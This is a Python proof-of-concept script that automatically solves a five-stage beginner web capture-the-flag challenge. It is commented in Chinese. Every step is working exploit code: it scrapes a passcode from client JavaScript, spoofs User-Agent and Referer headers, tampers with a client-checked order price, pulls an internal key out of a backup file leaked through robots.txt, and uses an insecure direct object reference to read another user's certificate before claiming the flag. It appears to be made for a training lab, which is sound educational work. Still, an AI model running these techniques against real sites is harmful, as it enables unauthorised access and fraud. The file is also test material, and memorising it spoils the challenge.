#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""web_xinshoucun 利用链条 PoC：五关全自动走完 -> 毕业门 -> 提取 flag。

步骤化演示（非 PASS/FAIL 断言脚本）：
  1. 读 village.js 源码找隐形告示牌口令 eyes-open，交第一关领 EYES
  2. 自定义 User-Agent + Referer 向 messenger.php 寄信，领 say-hello -> VOICE
  3. 绕过前端验钞机，POST 价格 10 的订单买图纸，Base64 解密 -> smith-hand -> HANDS
  4. robots.txt -> 泄露的 .bak 备份 -> $INTERNAL_KEY -> 调 supply.php -> trail-blazer -> MAP
  5. rookie 登录领会话 -> cert.php?uid=1000 越权看村长证书 -> first-blood -> SWORD
  6. 五装备词填毕业门，石碑发放注入的 FLAG

用法：python3 exp.py http://HOST:58000
仅用标准库，无第三方依赖。
"""
import base64
import re
import sys
import urllib.parse
import urllib.request
import http.cookiejar

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:58000"

# 无会话的直连 opener（前四关不需要登录）
def fetch(url, data=None, headers=None):
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=body, headers=headers or {})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode("utf-8", "replace")

# 带会话的 opener（第五关：登录领 PHPSESSID）
cj = http.cookiejar.CookieJar()
sess = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch_sess(url, data=None):
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=body)
    with sess.open(req, timeout=15) as r:
        return r.read().decode("utf-8", "replace")

def say(step, msg):
    print("[{}] {}".format(step, msg))

# ---------- 第 1 关：JS 动态 DOM 里的隐形告示牌 ----------
js = fetch(BASE + "/village.js")
pass1 = re.search(r"口令：([a-z0-9-]+)", js).group(1)
say(1, "village.js 里挂了块隐形告示牌，口令：{}".format(pass1))
page = fetch(BASE + "/s1-look-f3a9.php", data={"pass": pass1})
equip1 = re.search(r"碎片 1 / 5 ：(\w+)", page).group(1)
say(1, "交回老兵，装备到手：{}".format(equip1))

# ---------- 第 2 关：自己署名的信（UA + Referer） ----------
page = fetch(
    BASE + "/messenger.php",
    headers={
        "User-Agent": "RookieCourier/1.0",
        "Referer": "https://elders.village.gov/",
    },
)
pass2 = re.search(r"口令：([a-z0-9-]+)", page).group(1)
say(2, "两张名片齐全，驿站回执口令：{}".format(pass2))
page = fetch(BASE + "/s2-speak-7c21.php", data={"pass": pass2})
equip2 = re.search(r"碎片 2 / 5 ：(\w+)", page).group(1)
say(2, "交回梅琳，装备到手：{}".format(equip2))

# ---------- 第 3 关：绕过验钞机，改价买图纸 ----------
page = fetch(BASE + "/forge.php", data={"item": "sword-blueprint", "price": 10})
cipher = re.search(r'class="flagline">([A-Za-z0-9+/=]+)</div>', page).group(1)
plain = base64.b64decode(cipher).decode()
pass3 = re.search(r"passcode is ([a-z-]+)", plain).group(1)
say(3, "10 金币成交，图纸密文解码：{!r}".format(plain))
say(3, "铁匠烫在角落的口令：{}".format(pass3))
page = fetch(BASE + "/s3-forge-b55d.php", data={"pass": pass3})
equip3 = re.search(r"碎片 3 / 5 ：(\w+)", page).group(1)
say(3, "交回布洛克，装备到手：{}".format(equip3))

# ---------- 第 4 关：robots -> 泄露备份 -> 内部钥匙 ----------
robots = fetch(BASE + "/robots.txt")
bak_path = re.search(r"Disallow: (\S+)", robots).group(1)
say(4, "robots.txt 禁地：{}".format(bak_path))
bak = fetch(BASE + bak_path)
key = re.search(r"\$INTERNAL_KEY\s*=\s*'([^']+)'", bak).group(1)
say(4, "备份源码泄露内部钥匙：{}".format(key))
page = fetch(BASE + "/supply.php?" + urllib.parse.urlencode({"key": key}))
pass4 = re.search(r"口令：([a-z0-9-]+)", page).group(1)
say(4, "补给箱开箱，口令：{}".format(pass4))
page = fetch(BASE + "/s4-explore-e842.php", data={"pass": pass4})
equip4 = re.search(r"碎片 4 / 5 ：(\w+)", page).group(1)
say(4, "交回艾拉，装备到手：{}".format(equip4))

# ---------- 第 5 关：登录 -> 证书处 IDOR ----------
fetch_sess(BASE + "/s5-hit-d19c.php", data={"user": "rookie", "pass": "rookie123"})
say(5, "rookie 登录村公所，领到会话手环（{}）".format(
    "; ".join(c.name for c in cj)))
page = fetch_sess(BASE + "/cert.php?uid=1000")
cipher = re.search(r'class="flagline">([A-Za-z0-9+/=]+)</div>', page).group(1)
pass5 = base64.b64decode(cipher).decode()
say(5, "cert.php?uid=1000 越权调出村长证书，口令：{}".format(pass5))
page = fetch_sess(BASE + "/s5-hit-d19c.php", data={"pw": pass5})
equip5 = re.search(r"碎片 5 / 5 ：(\w+)", page).group(1)
say(5, "交回罗兰，装备到手：{}".format(equip5))

# ---------- 毕业门：五装备归位，领 flag ----------
page = fetch(BASE + "/graduate-a67f.php", data={
    "e1": equip1, "e2": equip2, "e3": equip3, "e4": equip4, "e5": equip5,
})
flag = re.search(r'class="final-flag">([^<]+)</div>', page).group(1)
say(6, "五件装备 {} 归位，石门开启".format("_".join([equip1, equip2, equip3, equip4, equip5])))
print("\nFLAG: {}".format(flag))
